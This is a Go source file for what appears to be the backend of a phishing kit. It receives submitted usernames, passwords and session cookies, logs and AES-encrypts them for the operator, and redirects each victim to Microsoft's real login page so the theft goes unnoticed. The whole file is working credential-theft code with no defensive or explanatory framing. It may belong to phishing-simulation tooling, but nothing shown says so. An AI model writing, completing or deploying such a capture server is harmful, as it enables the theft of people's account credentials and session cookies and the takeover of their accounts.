package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

var storageKey []byte

func main() {
	keyB64 := os.Getenv("STORAGE_KEY")
	if keyB64 == "" {
		log.Fatal("STORAGE_KEY env var required (base64-encoded 32-byte AES key). Generate: go run ../payload-generator/keygen.go")
	}
	var err error
	storageKey, err = base64.StdEncoding.DecodeString(keyB64)
	if err != nil || len(storageKey) != 32 {
		log.Fatal("STORAGE_KEY must be base64-encoded 32-byte AES key")
	}

	port := os.Getenv("PORT")
	if port == "" {
		port = "9090"
	}

	redirectURL := os.Getenv("REDIRECT_URL")
	if redirectURL == "" {
		redirectURL = "https://login.microsoftonline.com"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("POST /capture", handleCapture(redirectURL))
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	log.Printf("Capture backend listening on :%s (redirect: %s)", port, redirectURL)
	log.Fatal(http.ListenAndServe(":"+port, mux))
}

func handleCapture(redirectURL string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "bad form", http.StatusBadRequest)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")
		uuid := r.FormValue("uuid")
		cookies := r.FormValue("cookies")

		log.Printf("[CAPTURE] uuid=%s username=%s ip=%s ua=%s",
			uuid, username, r.RemoteAddr, r.UserAgent())

		data := map[string]interface{}{
			"timestamp":  time.Now().UTC().Format(time.RFC3339),
			"username":   username,
			"password":   password,
			"uuid":       uuid,
			"cookies":    cookies,
			"ip":         r.RemoteAddr,
			"user_agent": r.UserAgent(),
		}
		raw, _ := json.Marshal(data)

		encrypted, err := encryptAESGCM(raw, storageKey)
		if err != nil {
			log.Printf("[ERROR] encrypt: %v", err)
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}

		// Write encrypted data to stdout (can be piped to file in production)
		fmt.Printf("CAPTURE: %s\n", base64.StdEncoding.EncodeToString(encrypted))

		http.Redirect(w, r, redirectURL, http.StatusFound)
	}
}

func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}
